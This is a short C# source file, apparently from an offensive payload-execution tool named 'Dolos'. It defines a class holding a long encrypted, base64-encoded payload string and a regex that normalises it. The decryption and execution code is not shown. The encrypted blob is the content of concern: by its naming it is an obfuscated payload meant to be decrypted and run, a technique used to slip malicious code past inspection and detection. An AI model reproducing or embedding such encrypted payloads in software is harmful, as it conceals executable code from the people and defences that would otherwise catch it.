﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace Dolos_Payload_Execution
{
    class Payload
    {
        public static String EncyptedPayloadDirty = "+eBvyIhfgzNnCQqNuav9dCGDUiAHnH2fgjROQfP062MZTfeViZ4W+P6ZSD1wB8ue2R+IBEsw5mL7OgeZ0DldCL0ryFmO0C/s+ch+S41h9Rw2Yk8kkA3L2qkj+Ijrm3cAiDw2+6Omj39kQo4SjQ8CQ7lWp6KQmuKsa6NiJ1SXLJWq8totKFKgArntwf7oC2yrMx4s4tsAlyhDwVSIVPpA+A6yf+ANDHI1PS5QIjnJjyqLRvTlw5scszqCLQWQHF0qUWygIv/SXvAT95jfxc0AQwFqfKdZXACle+Yk4/aCY+IOsYLT1cFDrOoq8wgIK3EKLdqIgYxEXSXvJNCvnOpwvIj7Yoq9uBANOHtrfL/7q3BRMcYgXSHeuHqR3Hmjt3sWe1mAHA+WoJ4g/isg+I9L3ROel+q3qV6Do7iH9t3svM6i9cG8KJ6CtwfrnSSQkmP9Gqq8i17uqMKJJsa/xJKG2GGTdnVYEcoRSx2z9N9YGyLu2mT6Vt3jL+2Cd46bnC4JXecUUIPY/gfJK/ckHup4I7hyQRKHXVN5Y733dCo7nGQiOAxmgWPygVMYHfmQS0iL3BVcbYWVqUQ1YoGFcvxicfsOvO++FAwk9BoUc+gbCeZ4c00Htoqst8xsinQjMOmxmObWHCkbkVAtKd15E8KNsCISavzko5s9YAL6bm0ZsP1G6BEGE0PEOvnzujuGjgaLEz0WyufYAYZLPS7+q7tREnFcLAPCEgjY2ZG1liHJNnKNjtLChy5WGgWiy2fUPobn7AdLhnuzMXh23JThhykHuKmkzNMCQs/zdays58LRNfhJ/pDwnPMS0KHg5JoKBbaUpft3qHtvguprJnIjztUytEHUg+mSUnQAkQdhXrjwng8HRqNBFXCOobPxHVpTVOxgFQHXxbCtta23QfMITXt6gTNO4pTMNS0MCMBwWMGyQJ5RPcyZ5byuIPDhPdDoFvjcijcarcvU5EdhXGYiIxTEczcPsW6hVhyUNoVuHW4JjQ==";
        public static String EncyptedPayload = Regex.Replace(EncyptedPayloadDirty, @"\s+", "");
    }
}
